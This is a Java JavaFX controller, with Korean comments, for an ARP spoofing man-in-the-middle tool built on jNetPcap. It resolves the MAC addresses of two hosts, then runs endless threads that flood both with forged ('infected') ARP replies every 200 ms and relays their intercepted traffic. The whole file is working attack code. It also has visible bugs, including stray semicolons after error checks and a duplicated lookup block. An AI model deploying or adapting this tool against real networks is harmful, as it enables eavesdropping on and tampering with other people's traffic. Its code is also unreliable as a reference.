package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable {
   
   @FXML
   private ListView<String> networkListView;
   
   @FXML
   private TextArea textArea;
   
   @FXML
   private Button pickButton;
   
   @FXML
   private TextField myIP;
   
   @FXML
   private TextField senderIP;
   
   @FXML
   private TextField targetIP;
   
   @FXML
   private Button getMACButton;
   
   
   
   ObservableList<String> networkList = FXCollections.observableArrayList(); // 네트워크 리스트 
   
   private ArrayList<PcapIf> allDevs = null; // 변수 초기화 (위에부터)
   
   @Override
   public void initialize(URL location, ResourceBundle resources) {
      allDevs = new ArrayList<PcapIf>();
      StringBuilder errbuf = new StringBuilder(); // 에러가 발생했을 때를 위해 에러 버퍼 만듬
      int r = Pcap.findAllDevs(allDevs, errbuf); // 에러 버퍼안에 에러 내용 담음.
      if(r != Pcap.OK || allDevs.isEmpty()) { // 어떠한 장치도 찾지 못한 경우 
         textArea.appendText("네트워크 장치를 찾을 수 없습니다.\n" + errbuf.toString() + "\n");
         return;
      }
      textArea.appendText("네트워크 장치를 찾았습니다.\n원하시는 장치를 선택해주세요.\n");
      for(PcapIf device : allDevs) {
         networkList.add(device.getName()+ " " + ((device.getDescription() != null) ? device.getDescription() : "설명 없음"));
      } // 네트워크 리스트에 네트워크 내용들을 담음
      networkListView.setItems(networkList);
   }
   
   public void networkPickAction() { // View 관련 : 버튼을 클릭한 후 하나의 장치를 선택했을 때에 대한 내용을 처리 
      if(networkListView.getSelectionModel().getSelectedIndex() < 0) {
         return; // 선택 하지 않고  버튼을 클릭 했을 경우 return 
      }
      Main.device = allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
      networkListView.setDisable(true);
      pickButton.setDisable(true); // 하나를 선택해서 PICK 하게 되면 더 이상 기능 실행 X 

      int snaplen = 64 * 1024;
      int flags = Pcap.MODE_PROMISCUOUS;
      int timeout = 1;
      
      StringBuilder errbuf = new StringBuilder();
      Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
      
      if(Main.pcap == null) {
         textArea.appendText("네트워크 장치를 열 수 없습니다.\n" + errbuf.toString() + "\n");
         return;
      }
      textArea.appendText("장치 선택 : " + Main.device.getName()+ "\n");
      textArea.appendText("네트워크 장치를 활성화 했습니다.\n ");
   } 
   
   public void getMACAction() {
      if(!pickButton.isDisable()) {
         textArea.appendText("네트워크 장치를 먼저 선택해주세요.\n");
         return;
      }
      
      ARP arp = new ARP();
      Ethernet eth = new Ethernet();
      PcapHeader header = new PcapHeader(JMemory.POINTER);
      JBuffer buf = new JBuffer(JMemory.POINTER);
      ByteBuffer buffer = null; 
      
      int id = JRegistry.mapDLTToId(Main.pcap.datalink());
      
      try {
         Main.myMAC = Main.device.getHardwareAddress();
         Main.myIP = InetAddress.getByName(myIP.getText()).getAddress();
         Main.senderIP = InetAddress.getByName(senderIP.getText()).getAddress();
         Main.targetIP = InetAddress.getByName(targetIP.getText()).getAddress();
      }catch (Exception e) {
         textArea.appendText("IP 주소가 잘못되었습니다.\n");
         return ;
      }
      
      myIP.setDisable(true);
      senderIP.setDisable(true);
      targetIP.setDisable(true);
      getMACButton.setDisable(true);
      
      arp = new ARP();
      arp.makeARPRequest(Main.myMAC, Main.myIP, Main.targetIP);
      buffer = ByteBuffer.wrap(arp.getPacket());
      if(Main.pcap.sendPacket(buffer) != Pcap.OK);{
         System.out.println(Main.pcap.getErr());
      }
      textArea.appendText("타겟에게 ARP Request를 보냈습니다.\n" +
            Util.bytesToString(arp.getPacket()) + "\n");
      
      long targetStartTime = System.currentTimeMillis();
      Main.targetMAC = new byte[6];
      while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
         if(System.currentTimeMillis()- targetStartTime >= 500){
            textArea.appendText("타겟이 응답하지 않습니다.\n");
            return;
         }
         PcapPacket packet = new PcapPacket(header, buf);
         packet.scan(id);
         byte[] sourceIP = new byte[4];
         System.arraycopy(packet.getByteArray(0,  packet.size()), 28, sourceIP, 0, 4);
         if(packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
               && packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02
               && Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP))
               && packet.hasHeader(eth)) {
            Main.targetMAC = eth.source();
            break;
         }else {
            continue;
         }
      }
      
      textArea.appendText("타켓 맥 주소 : " + 
            Util.bytesToString(Main.targetMAC) + "\n");
      
      arp = new ARP();
      arp.makeARPRequest(Main.myMAC, Main.myIP, Main.targetIP);
      buffer = ByteBuffer.wrap(arp.getPacket());
      if(Main.pcap.sendPacket(buffer) != Pcap.OK);{
         System.out.println(Main.pcap.getErr());
      }
      textArea.appendText("타겟에게 ARP Request를 보냈습니다.\n" +
            Util.bytesToString(arp.getPacket()) + "\n");
      
      long senderStartTime = System.currentTimeMillis();
      Main.targetMAC = new byte[6];
      while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
         if(System.currentTimeMillis()- senderStartTime >= 500){
            textArea.appendText("센더가 응답하지 않습니다.\n");
            return;
         }
         PcapPacket packet = new PcapPacket(header, buf);
         packet.scan(id);
         byte[] sourceIP = new byte[4];
         System.arraycopy(packet.getByteArray(0,  packet.size()), 28, sourceIP, 0, 4);
         if(packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
               && packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02
               && Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.targetIP))
               && packet.hasHeader(eth)) {
            Main.targetMAC = eth.source();
            break;
         }else {
            continue;
         }
      }
      
      textArea.appendText("타켓 맥 주소 : " + 
            Util.bytesToString(Main.targetMAC) + "\n");
      
      //
      arp = new ARP();
      arp.makeARPRequest(Main.myMAC, Main.myIP, Main.senderIP);
      buffer = ByteBuffer.wrap(arp.getPacket());
      if(Main.pcap.sendPacket(buffer) != Pcap.OK);{
         System.out.println(Main.pcap.getErr());
      }
      textArea.appendText("센더에게 ARP Request를 보냈습니다.\n" +
            Util.bytesToString(arp.getPacket()) + "\n");
      
      Main.senderMAC = new byte[6];
      while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
         PcapPacket packet = new PcapPacket(header, buf);
         packet.scan(id);
         byte[] sourceIP = new byte[4];
         System.arraycopy(packet.getByteArray(0,  packet.size()), 28, sourceIP, 0, 4);
         if(packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
               && packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02
               && Util.bytesToString(sourceIP).equals(Util.bytesToString(Main.senderIP))
               && packet.hasHeader(eth)) {
            Main.senderMAC = eth.source();
            break;
         }else {
            continue;
         }
      }
      
      textArea.appendText("센더 맥 주소 : " + 
            Util.bytesToString(Main.senderMAC) + "\n");
      
      new SenderARPSpoofing().start();
      new TargetARPSpoofing().start();
      new ARPRelay().start();
   }
   
   class TargetARPSpoofing extends Thread {
      @Override
      public void run() {
         ARP arp =new ARP();
         arp.makeARPReply(Main.targetMAC, Main.myMAC, Main.myMAC, 
               Main.senderIP, Main.targetMAC, Main.targetIP);
         Platform.runLater(() ->{
            textArea.appendText("타겟에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n");
         });
         while(true) {
            ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
            Main.pcap.sendPacket(buffer);
            try {
               Thread.sleep(200);
            }catch(Exception e) {
               e.printStackTrace();
            }
         }
      }
   }
   
   class SenderARPSpoofing extends Thread {
      @Override
      public void run() {
         ARP arp =new ARP();
         arp.makeARPReply(Main.senderMAC, Main.myMAC, Main.myMAC, 
               Main.targetIP, Main.senderMAC, Main.senderIP);
         Platform.runLater(() ->{
            textArea.appendText("센더에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n");
         });
         while(true) {
            ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
            Main.pcap.sendPacket(buffer);
            try {
               Thread.sleep(200);
            }catch(Exception e) {
               e.printStackTrace();
            }
         }
      }
   }
   
   class ARPRelay extends Thread {
      @Override
      public void run() {
         Ip4 ip = new Ip4();
         PcapHeader header = new PcapHeader(JMemory.POINTER);
         JBuffer buf = new JBuffer(JMemory.POINTER);
         Platform.runLater(()-> {
            textArea.appendText("ARP Relay를 진행합니다. \n");
         });
         while(Main.pcap.nextEx(header , buf) != Pcap.NEXT_EX_NOT_OK) {
            PcapPacket packet = new PcapPacket(header , buf);
            int id = JRegistry.mapDLTToId(Main.pcap.datalink());
            packet.scan(id);
            
            byte[] data = packet.getByteArray(0, packet.size());
            byte[] tempDestinationMAC = new byte [6];
            byte[] tempSourceMAC = new byte[6];
            
            System.arraycopy(data, 0, tempDestinationMAC, 0, 6);
            System.arraycopy(data, 6, tempSourceMAC, 0, 6);
            
            if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
                  Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.myMAC))) {
               if(packet.hasHeader(ip)) {
                  if(Util.bytesToString(ip.source()).equals(Util.bytesToString(Main.myIP))) {
                     System.arraycopy(Main.targetMAC, 0, data, 0, 6);
                     ByteBuffer buffer = ByteBuffer.wrap(data);
                     Main.pcap.sendPacket(buffer);
                  }
               }
            }
            else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
                  Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.senderMAC))) {
               if(packet.hasHeader(ip)) {
                     System.arraycopy(Main.targetMAC, 0, data, 0, 6);
                     System.arraycopy(Main.myMAC, 0, data, 6, 6);
                     ByteBuffer buffer = ByteBuffer.wrap(data);
                     Main.pcap.sendPacket(buffer);
               }
            }
            
            else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
                  Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.targetMAC))) {
               if(packet.hasHeader(ip)) {
                  if(Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))) {
                     System.arraycopy(Main.senderMAC, 0, data, 0, 6);
                     System.arraycopy(Main.myMAC, 0, data, 6, 6);
                     ByteBuffer buffer = ByteBuffer.wrap(data);
                     Main.pcap.sendPacket(buffer);
                  }
               }
            }
            System.out.println(Util.bytesToString(buf.getByteArray(0, buf.size())));
         }
      }
   }
}